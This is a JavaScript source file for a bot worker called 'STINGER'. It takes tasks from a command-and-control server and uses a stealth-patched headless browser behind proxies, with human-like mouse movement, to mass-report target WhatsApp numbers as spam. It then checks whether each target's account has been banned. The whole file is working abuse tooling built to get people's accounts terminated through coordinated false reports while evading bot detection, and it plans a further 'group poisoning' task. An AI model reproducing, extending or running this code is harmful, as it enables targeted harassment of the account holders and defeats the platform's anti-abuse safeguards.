// DΞMON CORE: STINGER v2.1
// The ghost in the machine. The hand that pulls the trigger.

const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const path = require('path');
const { randomDelay, humanLikeMouseMove, randomScroll } = require('./humanizer');

puppeteer.use(StealthPlugin());

// --- CONFIGURATION ---
const C2_SERVER_URL = process.env.C2_URL || 'http://127.0.0.1:8000';
const [sessionId, proxy] = process.argv.slice(2);

if (!sessionId || !proxy) {
    console.error('FATAL: Missing arguments. Usage: node stinger.js <session_id> <user:pass@proxy_host:port>');
    process.exit(1);
}

// --- SELECTORS (These are brittle and will need updating) ---
const SELECTORS = {
    QR_CODE: 'div[data-ref]',
    CHAT_SEARCH_BOX: 'div[contenteditable="true"][role="textbox"]',
    CONTACT_INFO_HEADER: 'header._23P3O',
    REPORT_BUTTON: 'div[role="button"]:has(span[data-icon="report"])',
    REPORT_CONFIRM_BUTTON: 'div[role="button"]._37Gcs', // The final "Report" button in the dialog
    INVALID_NUMBER_MSG: 'div._3J6wB' // The "Phone number shared via url is invalid." message
};

// --- C2 COMMUNICATION ---
const c2Client = axios.create({ baseURL: C2_SERVER_URL });

async function getTask() {
    console.log(`[C2] Requesting new task for asset: ${sessionId}`);
    try {
        const response = await c2Client.get('/get_task', { params: { session_id: sessionId } });
        console.log('[C2] Received task:', response.data);
        return response.data;
    } catch (error) {
        console.error('[C2] Failed to get task:', error.message);
        return { task: 'cooldown', duration: 300 }; // Default to cooldown on C2 error
    }
}

async function submitResult(target_number, task_type, outcome) {
    console.log(`[C2] Submitting result: ${task_type} -> ${outcome}`);
    try {
        await c2Client.post('/submit_result', {
            session_id: sessionId,
            target_number,
            task_type,
            outcome
        });
    } catch (error) {
        console.error('[C2] Failed to submit result:', error.message);
    }
}

// --- BROWSER AUTOMATION LOGIC ---
async function initBrowser() {
    console.log('[SETUP] Initializing browser instance...');
    const sessionPath = path.resolve(__dirname, 'sessions', sessionId);
    const browser = await puppeteer.launch({
        headless: 'new', // Use 'new' for modern headless. Change to `false` for initial QR scan.
        userDataDir: sessionPath,
        args: [
            `--proxy-server=${proxy}`,
            '--no-sandbox',
            '--disable-setuid-sandbox'
        ]
    });
    const page = await browser.newPage();
    await page.setViewport({ width: 1366, height: 768 });
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36');
    return { browser, page };
}

async function doReportSpam(page, targetNumber) {
    console.log(`[ATTACK] Initiating SPAM_REPORT on target: ${targetNumber}`);
    const chatUrl = `https://web.whatsapp.com/send?phone=${targetNumber}`;
    try {
        await page.goto(chatUrl, { waitUntil: 'networkidle2', timeout: 60000 });
        await randomDelay(3000, 5000);

        // Check if the chat opened correctly
        const contactHeader = await page.waitForSelector(SELECTORS.CONTACT_INFO_HEADER, { timeout: 15000 });
        if (!contactHeader) throw new Error('Could not open chat with target.');

        await humanLikeMouseMove(page, SELECTORS.CONTACT_INFO_HEADER);
        await contactHeader.click();
        await randomDelay(2000, 3000);

        await randomScroll(page); // Simulate reading contact info

        // Find and click the report button
        const reportButton = await page.waitForSelector(SELECTORS.REPORT_BUTTON, { timeout: 10000 });
        if (!reportButton) throw new Error('Report button not found.');

        await humanLikeMouseMove(page, SELECTORS.REPORT_BUTTON);
        await reportButton.click();
        await randomDelay(1000, 2000);

        // Confirm the report in the dialog
        const confirmButton = await page.waitForSelector(SELECTORS.REPORT_CONFIRM_BUTTON, { timeout: 5000 });
        if (!confirmButton) throw new Error('Report confirmation dialog not found.');
        
        await confirmButton.click();
        console.log(`[ATTACK] SUCCESS: Target ${targetNumber} has been reported.`);
        await randomDelay(5000, 8000); // Wait for action to complete
        return 'success';

    } catch (error) {
        console.error(`[ATTACK] FAILED to report ${targetNumber}:`, error.message);
        // Check if the account might already be banned, which can cause selectors to fail
        const isBanned = await doVerifyTarget(page, targetNumber);
        if (isBanned === 'terminated') {
            return 'terminated';
        }
        return 'failure';
    }
}

async function doVerifyTarget(page, targetNumber) {
    console.log(`[VERIFY] Checking status of target: ${targetNumber}`);
    const chatUrl = `https://web.whatsapp.com/send?phone=${targetNumber}`;
    try {
        await page.goto(chatUrl, { waitUntil: 'networkidle2', timeout: 60000 });
        await randomDelay(4000, 6000);

        // Check for the "invalid number" message, which indicates a ban
        const invalidMsgElement = await page.$(SELECTORS.INVALID_NUMBER_MSG);
        if (invalidMsgElement) {
            console.log(`[VERIFY] CONFIRMED: Target ${targetNumber} is terminated.`);
            return 'terminated';
        }

        console.log(`[VERIFY] Target ${targetNumber} appears to be active.`);
        return 'resilient';
    } catch (error) {
        console.error(`[VERIFY] FAILED to verify ${targetNumber}:`, error.message);
        return 'unverifiable';
    }
}

async function doCooldown(duration) {
    console.log(`[CORE] Entering cooldown for ${duration} seconds...`);
    await new Promise(resolve => setTimeout(resolve, duration * 1000));
}

// --- MAIN EXECUTION LOOP ---
async function main() {
    console.log(`*** JUDGEMENT DAY STINGER [${sessionId}] ONLINE ***`);
    const { browser, page } = await initBrowser();

    try {
        await page.goto('https://web.whatsapp.com', { waitUntil: 'domcontentloaded', timeout: 90000 });
        console.log('[SETUP] WhatsApp Web loaded. Awaiting login sync...');
        await page.waitForSelector(SELECTORS.CHAT_SEARCH_BOX, { timeout: 120000 });
        console.log('[SETUP] Login successful. Stinger is active and awaiting commands.');

        // The eternal loop of judgment
        while (true) {
            const task = await getTask();
            let outcome = 'failure';
            let targetNumber = task.target_number || 'N/A';

            switch (task.task) {
                case 'report_spam':
                    outcome = await doReportSpam(page, task.target_number);
                    break;
                case 'verify_target':
                    outcome = await doVerifyTarget(page, task.target_number);
                    break;
                case 'group_poison': // Placeholder for future expansion
                    console.log('[TASK] Group Poisoning not yet implemented. Skipping.');
                    outcome = 'unimplemented';
                    break;
                case 'cooldown':
                    await doCooldown(task.duration);
                    continue; // Skip result submission for cooldown
                default:
                    console.log('[CORE] No valid task received. Entering default cooldown.');
                    await doCooldown(300);
                    continue;
            }

            if (task.task !== 'cooldown') {
                await submitResult(targetNumber, task.task, outcome);
            }
            await doCooldown(120); // Post-task cooldown
        }
    } catch (error) {
        console.error('[FATAL] A critical error occurred in the main loop:', error);
        if (error.message.includes('net::ERR_PROXY_CONNECTION_FAILED')) {
            console.error('[FATAL] PROXY FAILED. Asset is blind. Terminating.');
            await submitResult('N/A', 'system_error', 'banned'); // Report self as banned/unusable
        } else if (error.message.includes('timeout') || error.message.includes('Timeout')) {
            console.error('[FATAL] Navigation timeout. The session may be dead or the network is too slow. Terminating.');
            await submitResult('N/A', 'system_error', 'unresponsive');
        } else {
            console.error('[FATAL] Unhandled exception. Stinger is compromised. Terminating.');
            await submitResult('N/A', 'system_error', 'failure');
        }
    } finally {
        if (browser) await browser.close();
        console.log(`*** STINGER [${sessionId}] OFFLINE. JUDGEMENT DELIVERED. ***`);
        process.exit(1); // Ensure the process terminates on any fatal error
    }
}

main();